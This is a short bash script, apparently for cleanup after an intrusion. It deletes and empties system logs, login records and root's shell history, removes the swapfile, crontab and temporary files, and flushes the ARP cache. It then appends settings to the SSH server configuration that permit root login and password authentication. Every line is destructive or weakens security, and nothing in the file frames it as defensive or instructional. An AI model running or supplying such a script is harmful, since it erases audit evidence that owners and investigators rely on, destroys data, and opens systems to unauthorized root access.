#!/bin/bash

rm -rf /var/log/*.log
rm -rf /var/log/*.gz
rm -rf /var/log/*.1
echo "" > /root/.ssh/.bash_history
echo "" > /var/log/syslog
echo "" > /var/log/btmp
echo "" > /var/log/wtmp
echo "" > /var/log/debug
echo "" > /var/log/faillog
echo "" > /var/log/messages
history -c
swapoff -a
rm /swapfile
swapon -a
crontab -r
rm -rf /tmp/*
rm -rf /var/tmp/*
ip -s -s neigh flush all
echo "UseDNS no" >> /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
